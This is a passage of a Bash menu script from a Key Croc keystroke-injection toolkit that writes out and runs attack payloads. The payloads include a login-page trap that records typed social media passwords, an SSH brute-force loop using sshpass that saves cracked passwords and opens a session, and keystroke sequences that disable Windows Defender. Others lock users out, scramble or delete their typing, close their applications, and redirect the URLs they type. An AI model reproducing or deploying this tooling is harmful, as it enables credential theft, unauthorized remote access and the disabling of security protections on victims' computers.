			rm /root/udisk/tools/Croc_Pot/Croc_Bite.txt /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered /root/udisk/payloads/Croc_Bite.txt ;;
		*)
			invalid_entry ;;
	esac
else
	ColorYellow 'No existing Croc_Bite payload\n'
fi
##
#----Create Croc_Bite payload
##
bite_payload() {
	echo -ne "# Title:         Croc_Bite\n# Description:   Social media account passwd attempt this will open target web browser and open login page\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n\nMATCH ${1}\n
if [ -e \"/root/udisk/tools/Croc_Pot/Croc_OS.txt\" ]; then\n	case \$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in\nWINDOWS)\n	Q GUI d\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -NoP -NonI -W Hidden -Exec Bypass\"\n	Q ENTER
	sleep 2\n	Q STRING \"Start-Process ${@:2}; exit\"\n	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\nLINUX)\n	case \$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in
raspberrypi)\n	Q CONTROL-ALT-d\n	Q CONTROL-ALT-t\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\n$HOST_CHECK)\n	Q ALT-t\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\n*)\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\n	esac\n	esac\nelse\n	LED R\nfi\nLED FINISH" >> /root/udisk/payloads/Croc_Bite.txt
	cat /root/udisk/payloads/Croc_Bite.txt ; echo -ne "\n$LINE\n"
	ColorGreen "-Croc_Bite payload install check payloads folder
unplug keycroc plug back in type in match word $(ColorCyan "$1")\n"
}
##
#----Croc_Bite menu
##
	MenuTitle 'CROC BITE MENU' 
	MenuColor 19 1 'FACEBOOK ATTEMPT'
	MenuColor 19 2 'INSTAGRAM ATTEMPT'
	MenuColor 19 3 'TWITTER ATTEMPT'
	MenuColor 19 4 'TIKTOK ATTEMPT'
	MenuColor 19 5 'MESSENGER ATTEMPT'
	MenuColor 19 6 'GOOGLE ATTEMPT'
	MenuColor 19 7 'MICROSOFT ATTEMPT'
	MenuColor 19 8 'RETURN TO MAIN MENU'
	MenuEnd 18
	case "$m_a" in
		1) bite_payload facebook https://www.facebook.com/login/ ;;
		2) bite_payload instagram https://www.instagram.com/accounts/login/ ;;
		3) bite_payload twitter https://twitter.com/login/ ;;
		4) bite_payload tiktok https://careers.tiktok.com/login ;;
		5) bite_payload messenger https://www.messenger.com/login/ ;;
		6) bite_payload google https://accounts.google.com/signin ;;
		7) bite_payload microsoft https://login.microsoftonline.com/ ;;
		8) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; bite_payload ;;
		[bB]) install_payloads_menu ;; [pP]) Panic_button ;; *) invalid_entry ; bite_payload ;;
	esac
}
##
#----Croc_Redirect, payload/open web site on target default browser
##
web_site() {
	Info_Screen '-Enter website name example: https://forums.hak5.org/
-This will open target default web browser and start website
-Croc_Redirect payload match words https:// or http:// or IP address
-Simple payload to Redirect target web page
-Recommended to uninstall payload when not in use, do to match word
-Edit payload for web site to be Redirect
-NOTE:anytime https:// or http:// or IP address is type in
this will activate this payload'
##
#----Croc_Redirect payload install
##
	local Croc_Redirect=/root/udisk/payloads/Croc_Redirect.txt
if [ -f "$Croc_Redirect" ]; then
	cat "$Croc_Redirect" ; echo -ne "\n$LINE\n"
	ColorGreen 'Croc_Redirect.txt Payload is installed check payload folder\n'
else
	read_all 'INSTALL CROC_REDIRECT PAYLOAD Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			echo -ne "# Title:           Croc_Redirect\n# Description:     Simple payload to Redirect target web page\n#                  when not in use recommended to uninstall because of match words\n# Author:          spywill\n# Version:         1.1\n# Category:        Key Croc\n#\n#
MATCH (^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\$|http://|https://|\.com|\.br|\.net|\.org|.cz|\.au|\.co|\.jp|\.cn|\.ru|\.in|\.ir|\.ua|\.ca|\.xyz|\.site|\.top|\.icu|\.vip|\.online|\.de)\n\n#-->Enter Redirected web page here\nREDIRECT=https://forums.hak5.org/\n
#-->Remove user input and replace with Redirected web page\nLED ATTACK\nQ CONTROL-SHIFT-LEFTARROW\nQ BACKSPACE\nQ CONTROL-SHIFT-LEFTARROW\nQ BACKSPACE\nQ STRING \"\${REDIRECT}\"\nQ ENTER\nLED FINISH\nsleep 1\n\n#-->This will open target default web browser and start website\nif [ -e /root/udisk/tools/Croc_Pot/Croc_OS.txt ]; then
	LED ATTACK\n	OS_CHECK=\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n	HOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n	case \$OS_CHECK in\nWINDOWS)\n	Q GUI d\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell\"\n	Q ENTER\n	sleep 2
	Q STRING \"Start-Process \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;\nLINUX)\n	case \$HOST_CHECK in\nraspberrypi)\n	Q CONTROL-ALT-d\n	Q CONTROL-ALT-t\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;
\$HOST_CHECK)\n	Q ALT-t\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;\n*)\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"
	Q ENTER\n	LED FINISH ;;\n	esac\n	;;\nesac\nelse\n	LED R\nfi\n" > "$Croc_Redirect"
			cat "$Croc_Redirect" ; echo -ne "\n$LINE\n"
			ColorGreen 'Croc_Redirect.txt payload is now install check payloads folder\n' ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
fi
##
#----Enter web site and start web browser run from terminal
##
	read_all 'ENTER AND START WEB SITE Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			read_all 'ENTER WEB SITE NAME AND PRESS [ENTER]'
			start_web "$r_a" ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----NO_SLEEPING, Keep target screen from sleeping QUACK spacebar every 60 sec and backspace
##
screen_on() {
	Info_Screen '-No_sleeping payload MATCH word is nosleeping
-Keep Target screen from going to sleep
-This will QUACK spacebar every 60 sec and backspace
-PRESS CTRL + C to break loop in terminal'
##
#----No_Sleeping payload install
##
	local No_sleep=/root/udisk/payloads/No_Sleeping.txt
	if [ -f "$No_sleep" ]; then
		cat "$No_sleep" ; echo -ne "\n$LINE\n"
		ColorGreen 'No_Sleeping PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
	else
		read_all 'INSTALL NO_SLEEPING PAYLOAD Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				echo -ne "# Title:           No sleeping\n# Description:     Keep Target screen from going to sleeping\n# Author:          spywill\n# Version:         1.1\n# Category:        Key Croc
#\n#\nMATCH nosleeping\n\nQ GUI d\nwhile true ;do\nLED ATTACK\nWAIT_FOR_KEYBOARD_INACTIVITY 60\nQ KEYCODE 00,00,2c\nQ BACKSPACE\nLED R\ndone" > "$No_sleep"
				cat "$No_sleep" ; echo -ne "\n$LINE\n"
				ColorGreen 'No_Sleeping PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n' ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time\n' ;;
			*)
				invalid_entry ;;
		esac
	fi
##
#----Start No sleeping run from terminal
##
	read_all 'START NO_SLEEPING PAYLOAD Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			reset_broken
			ColorYellow "Waiting 60 sec\033[0K\r"
			while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_INACTIVITY 60; do
				QUACK KEYCODE 00,00,2c
				QUACK BACKSPACE
				(( i++ ))
				ColorYellow "NO_SLEEPING PAYLOAD IS RUNNING COUNT: $(ColorGreen "$i")\033[0K\r"
			done ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Croc_replace, Replace user text with random characters payload
##
text_replace() {
	Info_Screen '-Replace user text with random characters
-This will install Croc_replace.txt payload in payloads folder
-Enter the amount of times to replace characters to break loop
-NOTE: After payload has ran this will insert 
in front of match to disable Croc_replace.txt payload
-Restart payload enter arming mode and remove'
##
#----Croc_replace payload install
##
	local croc_replace=/root/udisk/payloads/Croc_replace.txt
	if [ -f "$croc_replace" ]; then
		cat "$croc_replace" ; echo -ne "\n$LINE\n"
		ColorGreen 'Croc_replace PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
	else
		read_all 'INSTALL CROC_REPLACE PAYLOAD Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				read_all 'ENTER NUMBER OF CHARACTER TO REPLACE AND PRESS [ENTER]'
				echo -ne "# Title:           Croc_replace\n# Description:     Replace user text with random characters enter a number for the amount to change\n#                  NOTE: TO restart this payload enter arming mode and remove the # in front of match
# Author:          spywill\n# Version:         1.1\n# Category:        Key Croc\n#\n#\nMATCH (?i)[0-9 a-z]\n\n#--->Enter the amount of characters to change here\nchar=${r_a}\n\necho -n \"\$(( i++ ))\" >> /tmp/text_replace.txt\nvar=\$(< /tmp/text_replace.txt)\n
if [[ \${#var} -gt \${char} ]]; then\n	LED B\n	DISABLE_PAYLOAD payloads/Croc_replace.txt\n	sed -i '9s/^/#/' /root/udisk/payloads/Croc_replace.txt\n	RELOAD_PAYLOADS\nelse\n	Q CONTROL-SHIFT-LEFTARROW\n	Q BACKSPACE\n	Q STRING \"\$(< /dev/urandom tr -cd '[:graph:]' | tr -d '\\\\\' | head -c 1)\$(< /dev/urandom tr -cd '[:graph:]' | tr -d '\\\\\' | head -c 1)\"
	LED R\nfi" > "$croc_replace"
				cat "$croc_replace" ; echo -ne "\n$LINE\n"
				ColorGreen 'Croc_replace PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n' ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time\n' ;;
			*)
				invalid_entry ;;
		esac
	fi
##
#----Start Croc_replace run from terminal
##
	read_all 'START CROC_REPLACE Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			local R=0
			read_all 'ENTER NUMBER OF TIMES TO REPLACE CHARACTER AND PRESS [ENTER]' ; local char="$r_a"
			ColorYellow "Waiting for keyboard activity\033[0K\r"
			while [ "$R" -eq "$char" ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0; do
				QUACK BACKSPACE
				QUACK BACKSPACE
				QUACK STRING "$(< /dev/urandom tr -cd '[:graph:]' | head -c 1)"
				(( R++ ))
				ColorYellow "KEYCROC HAS REPLACE USER INPUT COUNT: $(ColorGreen "$R")\033[0K\r"
			done ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Croc_Force, Brute-force attack on ssh host
##
Brute_force() {
	Info_Screen '-Payload call Croc_Force, Brute-force attack over ssh
-Brute-force attack consists of an attacker submitting many passwords or
passphrases with the hope of eventually guessing correctly.

-Add your own word list or install american-english-huge list
-Run Croc_Force live and if successful view passwd & start ssh session
-Run Croc_Force_payload will run in background, match word is crocforce
if successful save to loot/Croc_Pot/Croc_Force_Passwd.txt

-Edit payload for target: IP, hostname and full path of word list
-PRESS CTRL + C to break loop in terminal

when running payload the LED lights
-LED red -> and nothing after target is unreachable & payload disable
-LED flash red & blue -> attempting Brute-force attack
-LED green -> successful & payload disable

-Requirements: SSHPASS; wamerican-huge AMERICAN_WORDLIST default word list'
	install_package sshpass SSHPASS
	install_package wamerican-huge AMERICAN_WORDLIST
##
#----Croc_force payload install
##
	local CROC_FORCE=/root/udisk/payloads/Croc_Force_payload.txt
	if [ -f "$CROC_FORCE" ]; then
		cat "$CROC_FORCE" ; echo -ne "\n$LINE\n"
		ColorGreen 'CROC_FORCE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
	else
		read_all 'INSTALL CROC_FORCE PAYLOAD Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				read_all 'ENTER TARGET IP AND PRESS [ENTER]' ; local T_IP="$r_a"
				if [[ "$T_IP" =~ $validate_ip ]]; then
					ColorGreen 'IP OK\n'
					read_all 'ENTER TARGET HOST NAME AND PRESS [ENTER]'; local T_H="$r_a"
					ColorYellow "Add random numbers to the end of each word enter 0 for no numbers\nOr enter 10 or 100 or 1000 depend on how many numbers at end of word\n"
					read_all 'ENTER RANDOM NUMBER AMOUNT AND PRESS [ENTER]' ; local NUMBER_N="$r_a"
					ColorYellow 'Enter the full path of word list or use /usr/share/dict/american-english-huge\n'
					read_all 'ENTER FULL PATH OF WORD LIST LOCATION AND PRESS [ENTER]' ; local WORDFILE="$r_a"
					if [ -f "$WORDFILE" ]; then
						ColorGreen "Word list was located $WORDFILE\n"
						echo -ne "# Title:         Croc_Force\n#\n# Description:   Brute-force attack consists of an attacker submitting many passwords or\n#                passphrases with the hope of eventually guessing correctly. Requirements: SSHPASS
#                Save to loot/Croc_Pot/Croc_Force_Passwd.txt\n#\n# Author:        Spywill\n# Version:       1.1\n# Category:      Key Croc\n\nMATCH crocforce\n\n#--->Add Target IP here\nT_IP=${T_IP}\n\n#--->Add Target HOSTNAME here
T_H=${T_H}\n\n#--->Add the full path of word list here or install wamerican-huge add use /usr/share/dict/american-english-huge\nWORDFILE=\"${WORDFILE}\"\ntL=\`awk 'NF!=0 {++c} END {print c}' \$WORDFILE\`\n
#--->Add random numbers to the end of each word enter 0 for no numbers Or enter 10 or 100 or 1000 depend on how many numbers at end of word\nNUMBER_N=${NUMBER_N}\n\nnc -vz -v -w 1 \$T_IP 22 &>/dev/null 2>&1
if [[ \$? -ne 0 ]]; then\n	LED R && RELOAD_PAYLOADS && exit\nelse\n	LED B\nfi\n\nwhile true ; do\nLED B\nunset rnum R_W\nrnum=\$((RANDOM%\${tL}+1))\nR_W=\$(sed -n \"\$rnum p\" \$WORDFILE)\n\nif [ ! \"\${NUMBER_N}\" = \"0\" ]; then\n	R_N=\$(( \$RANDOM % \${NUMBER_N}+1 ))
else\n	unset R_N\nfi\n\nif [[ \"\$(sshpass -p \$R_W\$R_N ssh -o \"StrictHostKeyChecking no\" \$T_H@\$T_IP 'echo ok' | sed 's/\\\r//g')\" = \"ok\" ]]; then
	echo -ne \"Target Hostname: \$T_H\\\nTarget IP: \$T_IP\\\nTarget password: \$R_W\$R_N\" > /root/udisk/loot/Croc_Pot/Croc_Force_Passwd.txt\n	LED G\n	break\nelse\n	LED R\nfi\ndone" > "$CROC_FORCE"
						cat "$CROC_FORCE" ; echo -ne "\n$LINE\n"
						ColorGreen 'CROC_FORCE PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n'
					else
						invalid_entry ; ColorRed '\nDid not find Word list please try again\n'
					fi
				else
					invalid_entry ; ColorRed '\nInvalid ip address\n'
				fi ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time\n' ;;
			*)
				invalid_entry ;;
		esac
	fi
##
#----Croc_force start BRUTE-FORCE ATTACK run from terminal
##
	read_all 'START BRUTE-FORCE ATTACK IN TERMINAL Y/N AND PRESS [ENTER]'
	case "$r_a" in
	[yY] | [yY][eE][sS])
		read_all 'ENTER TARGET IP AND PRESS [ENTER]' ; local T_IP="$r_a"
		if [[ "$T_IP" =~ $validate_ip ]]; then
			nc -vz -w 2 "$T_IP" 22 &>"/dev/null"
			if [[ $? -ne 0 ]]; then
				ColorRed "Unable to reach host $T_IP\n"
			elif [[ "${#args[@]}" -eq 0 ]]; then
				read_all 'ENTER TARGET HOST NAME AND PRESS [ENTER]' ; local T_H="$r_a"
				ColorYellow "Add random numbers to the end of each word enter 0 for no numbers\nOr enter 10 or 100 or 1000 depend on how many numbers at end of word\n"
				read_all 'ENTER RANDOM NUMBER AMOUNT AND PRESS [ENTER]' ; local NUMBER_N="$r_a"
				ColorYellow 'Enter the full path of word list or use /usr/share/dict/american-english-huge\n'
				read_all 'ENTER FULL PATH OF WORD LIST LOCATION AND PRESS [ENTER]' ; local WORDFILE="$r_a"
				if [ -f "$WORDFILE" ]; then
					ColorGreen "Word list was located $WORDFILE\n"
					reset_broken
					while [ "$broken" -eq 1 ] && break || : ; do
						LED B
						if [ ! "$NUMBER_N" -eq 0 ]; then
							R_W="$(python -c 'import random; data=open("'$WORDFILE'").read().split(); print random.sample(data,1)[0]')$(( RANDOM % NUMBER_N+1 ))"
						else
							R_W="$(python -c 'import random; data=open("'$WORDFILE'").read().split(); print random.sample(data,1)[0]')"
						fi
						(( i++ ))
						ColorYellow "Trying: $(ColorCyan "$R_W")$(ColorYellow ' COUNT: ')$(ColorGreen "$i")\n"
						if [[ "$(sshpass -p "$R_W" ssh -o "StrictHostKeyChecking no" "$T_H"@"$T_IP" 'echo ok' | sed 's/\r//g')" = "ok" ]]; then
							LED G
							ColorYellow "Target Hostname: $(ColorGreen "$T_H")\n" | tee /root/udisk/loot/Croc_Pot/Croc_Force_Passwd.txt
							ColorYellow "Target IP: $(ColorGreen "$T_IP")\n" | tee -a /root/udisk/loot/Croc_Pot/Croc_Force_Passwd.txt
							ColorYellow "password is: $(ColorGreen "$R_W")\n" | tee -a /root/udisk/loot/Croc_Pot/Croc_Force_Passwd.txt
							sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" /root/udisk/loot/Croc_Pot/Croc_Force_Passwd.txt
							read_all 'START SSH SESSION Y/N PRESS [ENTER]' ; local ST_SS="$r_a"
							case "$ST_SS" in
								[yY] | [yY][eE][sS])
									sshpass -p "$R_W" ssh "$T_H"@"$T_IP" ;;
								[nN] | [nN][oO])
									ColorYellow 'Check at loot/Croc_Pot/Croc_Force_Passwd.txt\n' ;;
								*)
									invalid_entry ;;
							esac
							break
						else
							LED R
						fi
					done
				else
					invalid_entry ; ColorRed '\nDid not find Word list please try again\n'
				fi
			fi
		else
			invalid_entry ; ColorRed '\nInvalid ip address\n'
		fi ;;
	[nN] | [nN][oO])
		ColorYellow 'Maybe next time\n' ;;
	*)
		invalid_entry ;;
	esac
}
##
#----Croc_Lockout Payload/function Prevent user from logging-in, delete all keystroke entry
##
croc_lock() {
	Info_Screen '-Croc_Lockout payload match word croclockout
-Prevent user from logging-in this will delete all keystroke entry
-When running payload type stop to break loop
-PRESS CTRL + C to break loop in terminal
-If stuck in loop unplug keycroc plug back in
-If Croc_Unlock Payload is installed this will remove it
they both use QUACK GUI-l in the payload'
##
#----Croc_Lockout payload install
##
	local Croc_lockout=/root/udisk/payloads/Croc_Lockout.txt
	if [ -f "$Croc_lockout" ]; then
		cat "$Croc_lockout" ; echo -ne "\n$LINE\n"
		ColorGreen 'Croc_Lockout PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
	else
		read_all 'INSTALL CROC_LOCKOUT PAYLOAD Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				echo -ne "# Title:         Croc_Lockout\n#\n# Description:   Prevent user from logging-in this will delete all keystroke entry\n#                To stop payload type in stop If stuck in loop unplug keycroc plug back in
#\n# Author:        Spywill\n# Version:       1.1\n# Category:      Key Croc\n\nMATCH croclockout\n\nQ GUI-l\n#Q CONTROL-ALT-F3\n\nif [ -e \"/root/udisk/payloads/Croc_unlock.txt\" ]; then
	rm /root/udisk/payloads/Croc_unlock.txt\nfi\n\nSAVEKEYS /tmp/Croc_Lockout_stop.txt UNTIL stop\n\nwhile true ; do\nLED ATTACK\nWAIT_FOR_KEYBOARD_ACTIVITY 0
if [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/Croc_Lockout_stop.txt.filtered) = \"stop\" ]; then\n	LED B\n	sleep 1\n	LED OFF\n	RELOAD_PAYLOADS\n	break\nelse\n	Q CONTROL-SHIFT-LEFTARROW\n	Q BACKSPACE\n	Q CONTROL-SHIFT-LEFTARROW\n	Q BACKSPACE\n	LED R\nfi\ndone\n " > "$Croc_lockout"
				cat "$Croc_lockout" ; echo -ne "\n$LINE\n"
				ColorGreen 'Croc_Lockout PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n' ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time\n' ;;
			*)
				invalid_entry ;;
		esac
	fi
##
#----Croc_Lockout start lockout run from terminal
##
	read_all 'START CROC_LOCKOUT IN TERMINAL Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			if [ -f "/root/udisk/payloads/Croc_unlock.txt" ]; then
				rm /root/udisk/payloads/Croc_unlock.txt
				RELOAD_PAYLOADS
			fi
			reset_broken
			QUACK GUI-l
			QUACK CONTROL-ALT-F3
			ColorYellow "Waiting for keyboard activity\033[0K\r"
			while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0; do
				QUACK BACKSPACE
				QUACK BACKSPACE
				QUACK BACKSPACE
				QUACK BACKSPACE
				(( i++ ))
				ColorYellow "KEYCROC HAS DELETE USER INPUT COUNT: $(ColorGreen "$i")\033[0K\r"
			done ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Windows defender ENABLE/DISABLE/PAYLOAD Function
##
windows_defender() {
	Info_Screen '-Windows defender ENABLE/DISABLE
-Install payload called Croc_Defender.txt
-MATCH word defenderenable to enable windows Defender
-MATCH word defenderdisable to Disable windows Defender'
if [ "$(OS_CHECK)" = WINDOWS ]; then
##
#----Windows defender enable run from terminal
##
defender_enable() {
	QUACK GUI i ; sleep 3 ; QUACK STRING "Windows Security settings" ; QUACK ENTER ; sleep 3 ; QUACK ENTER ; sleep 3 ; QUACK TAB ; QUACK ENTER ; sleep 3 ; QUACK TAB ; QUACK TAB ; QUACK TAB ; QUACK TAB ; QUACK ENTER ; sleep 2 ; QUACK LEFTARROW ; QUACK ENTER ; sleep 1 ; QUACK ALT-F4 ; sleep 1 ; QUACK ALT-F4
}
##
#----Windows defender disable run from terminal
##
defender_disable() {
	QUACK GUI i ; sleep 3 ; QUACK STRING "Windows Security settings" ; QUACK ENTER ; sleep 3 ; QUACK ENTER ; sleep 3 ; QUACK TAB ; QUACK ENTER ; sleep 3 ; QUACK TAB ; QUACK TAB ; QUACK TAB ; QUACK TAB ; QUACK ENTER ; sleep 2 ; QUACK KEYCODE 00,00,2c ; sleep 2 ; QUACK LEFTARROW ; QUACK ENTER ; sleep 1 ; QUACK ALT-F4 ; sleep 1 ; QUACK ALT-F4
}
##
#----Croc_Defender payload install
##
croc_defender() {
	local C_D=/root/udisk/payloads/Croc_Defender.txt
	if [ -f "$C_D" ]; then
		cat "$C_D" ; echo -ne "\n$LINE\n"
		ColorGreen 'Croc_Defender PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
	else
		read_all 'INSTALL CROC_DEFENDER PAYLOAD Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				echo -ne "# Title:           Croc_Defender\n# Description:     Disable/enable windows Defender with QUACK entry\n#                  Type defenderenable to enable windows Defender\n#                  Type defenderdisable to Disable windows Defender\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n
MATCH (defenderdisable|defenderenable)\n\nif [[ \"\$LOOT\" == \"defenderenable\" ]]; then\n	LED B\n	Q GUI i\n	sleep 3\n	Q STRING \"Windows Security settings\"\n	Q ENTER\n	sleep 3\n	Q ENTER\n	sleep 3\n	Q TAB\n	Q ENTER\n	sleep 3\n	Q TAB\n	Q TAB\n	Q TAB\n	Q TAB\n	Q ENTER\n	sleep 2\n	Q LEFTARROW\n	Q ENTER\n	sleep 1\n	Q ALT-F4\n	sleep 1\n	Q ALT-F4
elif [[ \"\$LOOT\" == \"defenderdisable\" ]]; then\n	LED R\n	Q GUI i\n	sleep 3\n	Q STRING \"Windows Security settings\"\n	Q ENTER\n	sleep 3\n	Q ENTER\n	sleep 3\n	Q TAB\n	Q ENTER\n	sleep 3\n	Q TAB\n	Q TAB\n	Q TAB\n	Q TAB\n	Q ENTER\n	sleep 2\n	Q KEYCODE 00,00,2c\n	sleep 2\n	Q LEFTARROW\n	Q ENTER\n	sleep 1
	Q ALT-F4\n	sleep 1\n	Q ALT-F4\nfi" > "$C_D"
				cat "$C_D" ; echo -ne "\n$LINE\n"
				ColorGreen 'Croc_Defender PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n' ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time\n' ;;
			*)
				invalid_entry ;;
		esac
	fi
}
##
#----Windows defender ENABLE/DISABLE Menu
##
	MenuTitle 'WINDOWS DEFENDER'
	MenuColor 25 1 'ENABLE WINDOWS DEFENDER'
	MenuColor 25 2 'DISABLE WINDOWS DEFENDER'
	MenuColor 25 3 'CROC DEFENDER PAYLOAD'
	MenuColor 25 4 'RETURN TO MAIN MENU'
	MenuEnd 23
	case "$m_a" in
		1) defender_enable ; windows_defender ;;
		2) defender_disable ; windows_defender ;;
		3) croc_defender ; windows_defender ;;
		4) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; windows_defender ;;
		[bB]) install_payloads_menu ;; [pP]) Panic_button ;; *) invalid_entry ; windows_defender ;;
	esac
else
	ColorRed "The KeyCroc is not pluged into Windows pc This will not work on this OS $(OS_CHECK)\n"
fi
}
##
#----Croc_close-it payload close current running application on target
##
close_it() {
	Info_Screen '-Croc_close_it payload MATCH word croccloseit
-Close current running application on target
-Any keyboard activity will close current running application
-PRESS CTRL + C to break loop in terminal
-When running payload type stop to break loop'
##
#----Croc_close_it payload install
##
	local croc_close=/root/udisk/payloads/Croc_close_it.txt
	if [ -f "$croc_close" ]; then
		cat "$croc_close" ; echo -ne "\n$LINE\n"
		ColorGreen 'Croc_close_it PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
	else
		read_all 'INSTALL CROC_CLOSE_IT PAYLOAD Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				echo -ne "# Title:         Croc_close_it\n#\n# Description:   Close current running application on target\n#                Any keyboard activity will close current running application
#                Type stop to end loop\n#\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n\nMATCH croccloseit\n\nSAVEKEYS /tmp/Croc_stop.txt UNTIL stop\n
while true ; do\nLED ATTACK\nWAIT_FOR_KEYBOARD_ACTIVITY 1\nif [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/Croc_stop.txt.filtered) = \"stop\" ]; then\n	LED OFF\n	break\nelse
	Q ALT-F4\n	Q ENTER\n	sleep 2\n	Q ALT-F4\nfi\ndone\n" > "$croc_close"
				cat "$croc_close" ; echo -ne "\n$LINE\n"
				ColorGreen 'Croc_close_it.txt payload is now install check payloads folder\n' ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time\n' ;;
			*)
				invalid_entry ;;
		esac
	fi
##
#----Croc_close_it run from terminal
##
	read_all 'START CROC_CLOSE_IT IN TERMINAL Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			reset_broken
			ColorYellow "Waiting for keyboard activity\033[0K\r"
			while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0; do
				QUACK ALT-F4
				QUACK ALT-F4
				QUACK ENTER
				sleep 2
				QUACK ALT-F4
				(( i++ ))
				ColorYellow "Application has CLOSED COUNT: $(ColorGreen "$i")\033[0K\r"
			done ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Double_up payload Repeat user keystroke entries
##
double_up() {
	Info_Screen '-Double_up payload
-Repeat user keystroke entries
-This will Quack once to repeat keyboard entries
-After install unplug keycroc plug back in
-Recommended to uninstall payload when not in use, do to match word
-Press F1 to remove Double_up payload and run RELOAD_PAYLOADS command'
	local D_U=/root/udisk/payloads/Double_up.txt
	if [ -f "$D_U" ]; then
		cat "$D_U" ; echo -ne "\n$LINE\n"
		ColorGreen 'DOUBLE_UP PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
	else
		read_all 'INSTALL DOUBLE_UP PAYLOAD Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
